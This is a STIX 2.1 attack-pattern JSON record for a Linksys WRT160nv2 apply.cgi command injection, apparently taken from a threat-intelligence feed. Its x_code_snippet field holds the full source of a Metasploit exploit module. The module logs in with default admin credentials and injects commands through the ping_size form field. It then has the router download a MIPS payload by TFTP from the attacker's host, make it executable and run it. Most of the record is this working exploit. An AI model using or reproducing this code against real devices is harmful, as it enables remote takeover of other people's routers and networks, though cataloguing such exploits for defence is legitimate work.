{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c6cf4bbf-22ec-46d0-b5cd-bb2575409924",
    "created": "2024-08-14T17:04:03.359135Z",
    "modified": "2024-08-14T17:04:03.359139Z",
    "name": "Linksys WRT160nv2 apply.cgi Remote Command Injection",
    "description": " Some Linksys Routers are vulnerable to an authenticated OS command injection on their web interface where default credentials are admin/admin or admin/password. Since it is a blind OS command injection vulnerability, there is no output for the executed command when using the cmd generic payload. This module has been tested on a Linksys WRT160n version 2 - firmware version v2.0.03. A ping command against a controlled system could be used for testing purposes. The exploit uses the tftp client from the device to stage to native payloads from the command injection. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/linksys_wrt160nv2_apply_exec.rb",
            "external_id": "linksys_wrt160nv2_apply_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.s3cur1ty.de/m1adv2013-012"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Linksys WRT160nv2 apply.cgi Remote Command Injection',\n      'Description' => %q{\n          Some Linksys Routers are vulnerable to an authenticated OS command injection on\n        their web interface where default credentials are admin/admin or admin/password.\n        Since it is a blind OS command injection vulnerability, there is no output for the\n        executed command when using the cmd generic payload. This module has been tested on\n        a Linksys WRT160n version 2 - firmware version v2.0.03. A ping command against a\n        controlled system could be used for testing purposes. The exploit uses the tftp\n        client from the device to stage to native payloads from the command injection.\n      },\n      'Author'      =>\n        [\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Vulnerability discovery and Metasploit module\n          'juan vazquez' # minor help with msf module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'BID', '57887' ],\n          [ 'EDB', '24478' ],\n          [ 'OSVDB', '90093' ],\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-012' ]\n        ],\n      'DisclosureDate' => '2013-02-11',\n      'Privileged'     => true,\n      'Platform'       => %w{ linux unix },\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          [ 'CMD',\n            {\n            'Arch' => ARCH_CMD,\n            'Platform' => 'unix'\n            }\n          ],\n          [ 'Linux mipsel Payload',\n            {\n            'Arch' => ARCH_MIPSLE,\n            'Platform' => 'linux'\n            }\n          ],\n        ],\n      'DefaultTarget'  => 1\n      ))\n\n    register_options(\n      [\n        OptString.new('HttpUsername', [ true, 'The username to authenticate as', 'admin' ]),\n        OptString.new('HttpPassword', [ true, 'The password for the specified username', 'admin' ]),\n        OptAddressLocal.new('LHOST', [ true, 'The listen IP address from where the victim downloads the MIPS payload' ]),\n        OptString.new('DOWNFILE', [ false, 'Filename to download, (default: random)' ]),\n        OptInt.new('DELAY', [true, 'Time that the HTTP Server will wait for the ELF payload request', 10])\n      ])\n  end\n\n\n  def request(cmd,user,pass,uri)\n    begin\n      res = send_request_cgi({\n        'uri'    => uri,\n        'method' => 'POST',\n        'authorization' => basic_auth(user,pass),\n        'vars_post' => {\n          \"submit_button\" => \"Diagnostics\",\n          \"change_action\" => \"gozila_cgi\",\n          \"submit_type\" => \"start_ping\",\n          \"action\" => \"\",\n          \"commit\" => \"0\",\n          \"ping_ip\" => \"1.1.1.1\",\n          \"ping_size\" => \"&#{cmd}&\",\n          \"ping_times\" => \"5\",\n          \"traceroute_ip\" => \"\"\n        }\n      })\n      return res\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return nil\n    end\n  end\n\n  def exploit\n    downfile = datastore['DOWNFILE'] || rand_text_alpha(8+rand(4))\n    uri = '/apply.cgi'\n    user = datastore['HttpUsername']\n    pass = datastore['HttpPassword']\n    lhost = datastore['LHOST']\n\n    #\n    # testing Login\n    #\n    print_status(\"#{rhost}:#{rport} - Trying to login with #{user} / #{pass}\")\n    begin\n      res = send_request_cgi({\n        'uri'     => uri,\n        'method'  => 'GET',\n        'authorization' => basic_auth(user,pass)\n      })\n      if res.nil? or res.code == 404\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n      if [200, 301, 302].include?(res.code)\n        print_good(\"#{rhost}:#{rport} - Successful login #{user}/#{pass}\")\n      else\n        fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} - Failed to connect to the web server\")\n    end\n\n    if target.name =~ /CMD/\n      if not (datastore['CMD'])\n        fail_with(Failure::BadConfig, \"#{rhost}:#{rport} - Only the cmd/generic payload is compatible\")\n      end\n      cmd = payload.encoded\n      res = request(cmd,user,pass,uri)\n      if (!res)\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to execute payload\")\n      else\n        print_status(\"#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state\")\n      end\n      return\n    end\n\n    #thx to Juan for his awesome work on the mipsel elf support\n    @pl = generate_payload_exe\n\n    #\n    # start our server\n    #\n    print_status(\"#{rhost}:#{rport} - Starting up our TFTP service\")\n    @tftp = Rex::Proto::TFTP::Server.new\n    @tftp.register_file(downfile,@pl,true)\n    @tftp.start\n\n    #\n    # download payload\n    #\n    print_status(\"#{rhost}:#{rport} - Asking the Linksys device to download #{downfile}\")\n    #this filename is used to store the payload on the device -> we have limited space for the filename!\n    filename = rand_text_alpha_lower(4)\n\n    #not working if we send all command together -> lets take three requests\n    cmd = \"tftp -l /tmp/#{filename} -r #{downfile} -g #{lhost}\"\n    res = request(cmd,user,pass,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n\n    # wait for payload download\n    if (datastore['DOWNHOST'])\n      print_status(\"#{rhost}:#{rport} - Giving #{datastore['DELAY']} seconds to the Linksys device to download the payload\")\n      select(nil, nil, nil, datastore['DELAY'])\n    else\n      wait_linux_payload\n    end\n    @tftp.stop\n    register_file_for_cleanup(\"/tmp/#{filename}\")\n\n    #\n    # chmod\n    #\n    cmd = \"chmod 777 /tmp/#{filename}\"\n    print_status(\"#{rhost}:#{rport} - Asking the Linksys device to chmod #{downfile}\")\n    res = request(cmd,user,pass,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n\n    #\n    # execute\n    #\n    cmd = \"/tmp/#{filename}\"\n    print_status(\"#{rhost}:#{rport} - Asking the Linksys device to execute #{downfile}\")\n    res = request(cmd,user,pass,uri)\n    if (!res)\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Unable to deploy payload\")\n    end\n\n  end\n\n  # wait for the data to be sent\n  def wait_linux_payload\n    print_status(\"#{rhost}:#{rport} - Waiting for the victim to request the ELF payload...\")\n\n    waited = 0\n    while (not @tftp.files.length == 0)\n      select(nil, nil, nil, 1)\n      waited += 1\n      if (waited > datastore['DELAY'])\n        @tftp.stop\n        fail_with(Failure::Unknown, \"#{rhost}:#{rport} - Target didn't request request the ELF payload -- Maybe it cant connect back to us?\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-11",
    "x_mitre_platforms": [
        "linux"
    ]
}